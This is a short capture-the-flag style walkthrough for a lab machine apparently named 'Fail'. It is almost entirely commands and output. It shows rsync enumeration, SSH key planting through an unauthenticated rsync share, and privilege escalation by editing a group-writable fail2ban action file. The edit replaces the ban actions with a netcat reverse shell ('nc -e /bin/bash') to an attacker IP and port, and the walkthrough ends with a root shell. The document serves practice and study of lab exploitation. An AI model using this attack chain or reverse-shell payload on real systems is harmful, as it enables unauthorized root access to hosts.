# Fail

### Enumeration

```
873/tcp open  rsync   (protocol version 31)
```

```
$ nmap -sV --script "rsync-list-modules" -p 873 192.168.145.126
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-15 18:38 EST
Nmap scan report for 192.168.145.126
Host is up (0.064s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  fox                 fox home

$ nc -nv 192.168.145.126 873
(UNKNOWN) [192.168.145.126] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
fox             fox home
@RSYNCD: EXIT
```

There is no password protection.

```
#Listing of shared folder
$ rsync -av --list-only rsync://192.168.145.126/fox 

#Copy contents of the specified folder
$ rsync -av rsync://192.168.145.126/fox ./fox

$ ssh-keygen -t rsa

#Dir uploading
$ rsync -av ~/Desktop/PG-Practice/Linux/Fail/.ssh rsync://192.168.145.126/fox
```

### Initial Access

```
$ ssh -i id_rsa fox@192.168.145.126
```

### PrivEsc

```
$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
```

[https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)

```
$ /etc/init.d/fail2ban status

$ ls -lh /etc/fail2ban
drwxrwxr-x  2 root fail2ban 4.0K Dec  3  2020 action.d

# /etc/fail2ban/action.d is WRITABLE by fail2ban group

$ cd /etc/fail2ban/action.d
$ vim iptables-multiport.conf

#Edit as following
*****************************
actionban = /usr/bin/nc -e /bin/bash 192.168.49.145 4444
actionunban = /usr/bin/nc -e /bin/bash 192.168.49.145 4444
*****************************

#Couple times with wrong pass then got root shell
$ ssh fox@192.168.145.126
```
